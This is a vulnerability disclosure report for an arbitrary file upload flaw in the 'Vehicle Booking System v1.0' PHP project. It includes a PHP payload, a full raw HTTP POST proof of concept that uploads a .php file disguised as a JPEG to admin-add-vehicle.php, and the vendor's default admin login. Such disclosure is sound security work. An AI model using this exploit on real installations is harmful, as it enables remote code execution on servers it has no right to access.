## Vulnerability Description

Arbitrary file upload vulnerability in [Vehicle Booking System v1.0](https://codeastro.com/vehicle-booking-system-in-php-with-source-code/) allows attackers to execute arbitrary code via the file upload to admin-add-vehicle.php. It is an open source project from https://codeastro.com .

1. Vulnerability Submitter: Tr0e
  
2. vendors: [Vehicle Booking System in PHP with Source Code - CodeAstro](https://codeastro.com/vehicle-booking-system-in-php-with-source-code/)
  
3. The program is built using the xmapp/v3.3.0 and PHP/8.1.10 version;
  
4. Vulnerability location: /VehicleBooking-PHP/admin/admin-add-vehicle.php
  

# Vulnerability Verification

[+] Payload:

```php
<?php phpinfo();?>
```

POC：

```js
POST http://192.168.0.120:91/VehicleBooking-PHP/admin/admin-add-vehicle.php HTTP/1.1
Host: 192.168.0.120:91
Content-Length: 895
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.0.120:91
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHwRD9k9A7fnBXCiu
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.0.120:91/VehicleBooking-PHP/admin/admin-add-vehicle.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ldi7mdlvm8g7bnfhunuvrhp8ne
Connection: close

------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_name"

Test
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_reg_no"

aaa
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_pass_no"

111
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_driver"

Demo User
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_category"

Bus
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_status"

Booked
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="v_dpic"; filename="Tr0e.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryHwRD9k9A7fnBXCiu
Content-Disposition: form-data; name="add_veh"


------WebKitFormBoundaryHwRD9k9A7fnBXCiu--

```

## How to verify

1. Build the vulnerability environment according to the steps provided by the source code author.  
2. log in to the background management system through the default account and password（Email: admin@mail.com
  Password: codeastro.com）;
3. The vulnerability lies in the "Vehicles - Add - Add Vehicle" function, you should inserts Payload when you Add Vehicle, as shown in the following figure：
![image](https://user-images.githubusercontent.com/42080954/194755070-3e398a03-e58a-4a79-ba3f-5b87acba831b.png)
![image](https://user-images.githubusercontent.com/42080954/194755111-376a6264-7ea5-4b84-8bf6-c13a4bdf8d22.png)
![image](https://user-images.githubusercontent.com/42080954/194755134-f39eebbc-ac0d-47cf-b334-76eec7e95a9e.png)



